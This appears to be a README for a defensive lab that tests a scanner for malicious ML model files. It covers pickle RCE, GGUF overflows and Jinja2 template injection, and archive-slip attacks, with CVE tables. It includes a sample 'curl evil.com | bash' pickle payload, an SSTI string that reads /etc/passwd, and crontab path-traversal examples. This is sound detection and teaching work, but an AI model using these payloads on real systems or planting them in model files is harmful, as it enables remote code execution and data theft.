# Eresus Sentinel — Model File Vulnerability (MFV) Lab

> **⚠️ Educational & defensive use only.** These notebooks demonstrate
> real-world attack vectors against ML model file formats. All payloads
> are mock/harmless — they prove Sentinel's detection capability, not
> weaponization.

## Why Model Files?

After training an LLM like ChatGPT, the weights must be serialized to
disk. These files aren't simple data blobs — they're complex formats like
Pickle, ONNX, GGUF, Keras, and PyTorch, each with their own parsing quirks
and potential vulnerabilities. The critical moment is when a user **loads**
that file into memory. That's where buffer overflows, arbitrary code
execution, and template injection attacks occur.

Traditional security research has spent decades hardening web and binary
attack surfaces. **Model file formats are the new frontier** — under-audited,
widely deployed, and increasingly targeted through supply-chain attacks
on model hubs like HuggingFace and Ollama.

This lab mirrors the structure of [protectai/modelscan](https://github.com/protectai/modelscan/tree/main/notebooks)
notebooks, but goes deeper with GGUF-specific and archive-slip attacks
that ModelScan doesn't cover.

---

## Vulnerability Taxonomy

### Format-Level Attack Surface

| Format | Serialization | Primary Risk | Confirmed CVEs / Research |
|--------|--------------|--------------|---------------------------|
| **Pickle** | Python object graph | `__reduce__` → ACE via `os.system`, `subprocess` | [Trail of Bits: "Never a Dull Moment"](https://blog.trailofbits.com/2021/03/15/never-a-dull-moment-when-you-pickle/), [Splunk ML Security Research](https://www.splunk.com/en_us/blog/security/surviving-the-artificial-intelligence-onslaught.html) |
| **PyTorch** (.pt/.pth) | ZIP + Pickle internally | All pickle risks + archive slip | [Huntr PoCs](https://huntr.com/), `torch.load()` [without `weights_only=True`](https://pytorch.org/docs/stable/generated/torch.load.html) |
| **Keras** (.keras/.h5) | ZIP + JSON config / HDF5 | Lambda layer ACE, `importlib` gadget | **CVE-2024-3660** (Lambda ACE, Keras < 2.13), **CVE-2025-1550** |
| **GGUF** | Binary header + tensors | Integer overflow → heap corruption | **CVE-2024-21802**, **CVE-2024-25664**, **CVE-2024-23496**, **CVE-2026-27940**, **CVE-2026-33298** — all [Huntr/llama.cpp](https://huntr.com/) |
| **GGUF** (metadata) | Jinja2 `chat_template` | SSTI → RCE via unsandboxed Jinja2 | **CVE-2024-34359** "Llama Drama" ([JFrog Research](https://research.jfrog.com/vulnerabilities/llama-cpp-python-jinja2-ssti/)), [Checkmarx HuggingFace scan](https://checkmarx.com/) |
| **ONNX** | Protobuf | Custom ops (.so/.dll load), external data SSRF | [ONNX Runtime CVEs](https://github.com/microsoft/onnxruntime/security/advisories), [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/) |
| **Safetensors** | JSON header + raw tensors | ✅ Safe by design (no code execution) | [HuggingFace Safetensors Spec](https://huggingface.co/docs/safetensors/) |
| **TFLite** | FlatBuffer | Malformed tensor metadata → buffer read | [TFLite Security Advisories](https://github.com/tensorflow/tensorflow/security) |
| **Archive** (.keras/.nemo/.mar) | ZIP / TAR | Path traversal (ZipSlip), symlink escape, bombs | [Huntr: "Pivoting Archive-Slip Bugs"](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai-ml-bounties) |

### Why Not Just Use Safetensors?

Safetensors is the recommended safe format, but:
- **Legacy models on HuggingFace Hub are Pickle/PyTorch** — thousands of models
- **GGUF is the standard for local LLM inference** (llama.cpp, Ollama, LM Studio)
- **Keras 3.x uses its own ZIP-based `.keras` format** (not Safetensors)
- **ONNX is the cross-framework deployment standard** (~50% of production models)

**You need to scan the formats people actually use, not just the safe ones.**

---

## OWASP LLM Top 10 Mapping

These notebooks demonstrate detection for:

| OWASP LLM ID | Risk | Notebook |
|---|---|---|
| **LLM05** Supply Chain Vulnerabilities | Backdoored models on HuggingFace | `pickle_rce_detection.py`, `model_backdoor_lab.py` |
| **LLM06** Sensitive Information Disclosure | Credential exfiltration via pickle payload | `pickle_rce_detection.py` |
| **LLM09** Misinformation | Template injection altering model behavior | `gguf_header_overflow.py` |
| **LLM10** Unbounded Consumption | Decompression bombs in model archives | `archive_slip_attacks.py` |

Source: [OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/)

---

## Notebooks

### 1. Pickle RCE Detection

**File:** [`pickle_rce_detection.py`](pickle_rce_detection.py)

The #1 model supply chain attack. Python's `__reduce__` method lets an
attacker embed arbitrary `os.system()` calls inside a pickle file. When
a victim loads the model with `torch.load()` or `pickle.load()`, the
payload executes **silently** — no warning, no prompt.

**Attack chain:**
```
Attacker creates MaliciousModel.__reduce__() → (os.system, ("curl evil.com | bash",))
    ↓
Pickle serializes as STACK_GLOBAL("os","system") + SHORT_BINUNICODE("cmd") + TUPLE1 + REDUCE
    ↓
Victim runs torch.load("model.pt") → pickle.load() → os.system("curl evil.com | bash")
```

**What Sentinel detects:**
- `STACK_GLOBAL` → `REDUCE` chain = confirmed RCE (confidence: 1.0)
- `GLOBAL` alone = callable imported, may execute (confidence: 0.7)
- Obfuscation via `base64.b64decode` / `codecs` / `marshal` wrapping
- Nested pickle (pickle-within-pickle double deserialization)

**CVE context:** Every pickle-based model format inherits this by design.
Trail of Bits called pickle ["a Turing-complete programming language disguised
as a serialization format"](https://blog.trailofbits.com/2021/03/15/never-a-dull-moment-when-you-pickle/).

```
python notebooks/pickle_rce_detection.py
```

---

### 2. GGUF Header Overflow & Jinja2 SSTI

**File:** [`gguf_header_overflow.py`](gguf_header_overflow.py)

Two distinct attack vectors against GGUF files (llama.cpp, Ollama, LM Studio):

**Attack A — Integer Overflow → Heap Corruption:**

Sets `n_kv = 0xFFFFFFFFFFFFFFFF` in the GGUF header. When llama.cpp does
`malloc(n_kv * sizeof(gguf_kv))`, the multiplication wraps to a small value,
but the parsing loop writes `n_kv` entries → heap corruption → potential RCE.

- **CVE-2024-21802**: `gguf_fread_str` string length overflow
- **CVE-2024-25664**: Tensor metadata integer overflow
- **CVE-2026-27940**: `gguf_init_from_file_impl()` integer overflow (bypass of CVE-2025-53630 fix)
- **CVE-2026-33298**: `ggml_nbytes` tensor dimension overflow

**Attack B — Jinja2 SSTI in chat_template (CVE-2024-34359 "Llama Drama"):**

GGUF files store `tokenizer.chat_template` as metadata. This is rendered
with Jinja2 by inference servers. JFrog discovered that `llama-cpp-python`
< 0.2.72 used an **unsandboxed** Jinja2 environment, allowing:

```jinja2
{{ self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

Checkmarx found **thousands of models on HuggingFace** with malicious
templates exploiting this exact vector.

**What Sentinel detects:**
- `n_kv` / `n_tensors` values exceeding safe thresholds (heap overflow)
- Jinja2 object traversal patterns (`__class__`, `__mro__`, `__subclasses__`)
- Dangerous function calls in templates (`os.system`, `subprocess`, `eval`)

```
python notebooks/gguf_header_overflow.py
```

---

### 3. Archive Slip Attacks

**File:** [`archive_slip_attacks.py`](archive_slip_attacks.py)

Model files like `.keras`, `.nemo`, `.pth`, `.mar` are ZIP/TAR archives
internally. Huntr's ["Pivoting Archive-Slip Bugs into AI/ML Bounties"](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai-ml-bounties)
showed how classic ZipSlip works in ML contexts:

**Attack types demonstrated:**
1. **Path traversal** — `../../etc/crontab` entries write outside extraction dir
2. **Compression bomb** — 10MB of zeros → 10KB compressed (ratio > 100:1 → DoS)
3. **Case-insensitive collision** — `Config.json` vs `config.json` on macOS/Windows

**What Sentinel detects:**
- Path traversal sequences (`../`, `..\\`, absolute paths)
- Symlink chain resolution (up to depth 10, detecting escape patterns)
- Compression ratio > 100:1 (decompression bomb)
- NTFS alternate data stream markers (`:$DATA`)
- Unicode normalization bypass (`\u202e` right-to-left override)
- Case-insensitive filename collisions

```
python notebooks/archive_slip_attacks.py
```

---

### 4. Model Backdoor Lab

**File:** [`model_backdoor_lab.py`](model_backdoor_lab.py)

Full end-to-end backdoor injection and detection workflow.

---

### 5. Prompt Attack Lab

**File:** [`prompt_attack_lab.py`](prompt_attack_lab.py)

Prompt injection attack patterns and Sentinel detection.

---

## Running

```bash
cd eresus-sentinel

# Run individual notebooks
python notebooks/pickle_rce_detection.py
python notebooks/gguf_header_overflow.py
python notebooks/archive_slip_attacks.py

# Run all
for f in notebooks/*.py; do echo "=== $f ==="; python "$f"; echo; done
```

---

## References & Research

### Primary (Model File Vulnerabilities)

- **[Huntr: Hunting 0-days in ML Model File Formats](https://blog.huntr.com/hunting-vulnerabilities-in-machine-learning-model-file-formats)** — The original MFV research that inspired this lab
- **[Huntr: Pivoting Archive-Slip Bugs into AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai-ml-bounties)** — ZipSlip in model archives
- **[Huntr: Keras Model Deserialization Vulnerabilities](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)** — CVE-2024-3660
- **[JFrog: "Llama Drama" CVE-2024-34359](https://research.jfrog.com/vulnerabilities/llama-cpp-python-jinja2-ssti/)** — GGUF Jinja2 SSTI
- **[Trail of Bits: "Never a Dull Moment When You Pickle"](https://blog.trailofbits.com/2021/03/15/never-a-dull-moment-when-you-pickle/)** — Pickle as a programming language
- **[Checkmarx: Malicious Models on HuggingFace](https://checkmarx.com/)** — Mass exploitation of CVE-2024-34359

### Frameworks & Standards

- **[OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/)** — LLM05: Supply Chain Vulnerabilities
- **[MITRE ATLAS: AML.T0010 ML Supply Chain Compromise](https://atlas.mitre.org/techniques/AML.T0010)** — Taxonomy for ML attacks
- **[AVID: AI Vulnerability Database](https://avidml.org/)** — S0403: Model Supply Chain

### Tools & Related Projects

- **[protectai/modelscan](https://github.com/protectai/modelscan)** — ProtectAI's open-source model scanner (our notebooks follow their demo structure)
- **[mmaitre314/picklescan](https://github.com/mmaitre314/picklescan)** — Pickle opcode scanner (Sentinel's pickle scanner is based on similar opcode analysis but adds STACK_GLOBAL + chain confirmation)
- **[HuggingFace Safetensors](https://huggingface.co/docs/safetensors/)** — The safe alternative to pickle-based formats

### Academic & Industry Research

- **[Awesome LLMs for Vulnerability Detection](https://github.com/huhusmang/Awesome-LLMs-for-Vulnerability-Detection)** — Curated list of LLM-based vuln detection research
- **[MLSecOps: Hidden Risks in Model Files](https://mlsecops.com/podcast/ai-security-vulnerability-detection-and-hidden-risks-in-model-files)** — Podcast covering model file attack surface
- **[Vaadata: Exploring LLM Vulnerabilities](https://www.vaadata.com/blog/exploring-llm-vulnerabilities-and-security-best-practices/)** — Vulnerability taxonomy and best practices
- **[ArXiv: Security Analysis of AI-Generated Fixes](https://arxiv.org/html/2507.02976v2)** — Research on LLM-generated code safety
- **[LLM Vulnerabilities Case Study](https://medium.com/@apil00chand/llm-vulnerabilities-case-study-2fec92f7c21d)** — Practical exploitation walkthrough

### CVE Database

| CVE | Format | Vulnerability | Status |
|-----|--------|--------------|--------|
| CVE-2024-34359 | GGUF | Jinja2 SSTI in chat_template ("Llama Drama") | Fixed in llama-cpp-python 0.2.72 |
| CVE-2024-3660 | Keras | Lambda layer arbitrary code execution | Fixed in Keras 2.13+ |
| CVE-2024-21802 | GGUF | gguf_fread_str heap overflow | Fixed |
| CVE-2024-25664 | GGUF | Integer overflow in tensor metadata | Fixed |
| CVE-2024-23496 | GGUF | Heap buffer overflow via crafted GGUF | Fixed |
| CVE-2026-27940 | GGUF | gguf_init_from_file_impl integer overflow | Fixed in llama.cpp b8146 |
| CVE-2026-33298 | GGUF | ggml_nbytes tensor dimension overflow | Fixed in llama.cpp b7824 |
| CVE-2025-1550 | Keras | Model deserialization ACE | Fixed |
